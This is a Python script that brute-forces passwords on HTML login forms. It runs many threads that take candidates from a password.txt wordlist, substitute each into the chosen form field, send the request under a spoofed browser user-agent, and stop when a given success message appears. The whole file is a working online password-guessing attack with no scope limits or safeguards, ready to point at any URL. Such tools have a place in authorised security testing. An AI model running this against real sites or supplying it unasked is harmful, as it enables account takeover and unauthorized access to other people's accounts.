import argparse, threading, queue, requests
from urllib.parse import urlparse, urljoin


parser = argparse.ArgumentParser(description="A fast password guesser for HTML Form")
parser.add_argument('-u', '--url', help='Enter the url of form action')
parser.add_argument('-d', '--data', help='Enter the exact query string(In case of GET) and body data (in case of POST)')
parser.add_argument('-m', '--method', help='Enter the form method (GE/POST)')
parser.add_argument('-f', '--field', help='Enter the key name to be bruteforced')
parser.add_argument('-s', '--success_message', help="Enter the message in case of sucessful login")
parser.add_argument('-t', '--threads', help="Enter the number of threads to run")

args = parser.parse_args()
url = args.url
data = args.data
method = args.method
success_message = args.success_message
threads = int(args.threads)
field = args.field

session = requests.Session()
session.headers['User-agent'] = "Chrome/51.0.2704.103 Safari/537.36"
if method == 'POST':
    session.headers['Content-type'] = 'application/x-www-form-urlencoded'

try:
    requests.get(url)
except:
    print("[+] Can't connect to url..")
    exit()
guessed = False
correct_password = ''


def http_guesser():
    global guessed, correct_password
    while not guessed and not q.empty():
        current_pass = q.get()
        try:
            print(f"[+] Trying.. {current_pass}")
            pairs = data.split('&')

            for j in range(len(pairs)):
                if field in pairs[j]:
                    field_array = [field, current_pass]
                    pairs[j] = '='.join(field_array)
            data_new = '&'.join(pairs)
            # print(f"New data: {data_new}")

            res = session.request(method, url, timeout=3, data=data_new, allow_redirects=True)
            if success_message in res.content.decode().lower():
                print(f"[+] Success message triggered on {current_pass}")
                correct_password = current_pass
                guessed = True
        except:
            pass
        q.task_done()

q = queue.Queue()

with open('password.txt', 'r') as file:
    for password in file.read().splitlines():
        q.put(password)

thread_list = []
for i in range(threads):
    t = threading.Thread(target=http_guesser, daemon=True)
    t.start()
    thread_list.append(t)

for th in thread_list:
    th.join()


if guessed:
    print(f"[+] Password found: {correct_password}")
else:
    print(f"[+] Password not found")

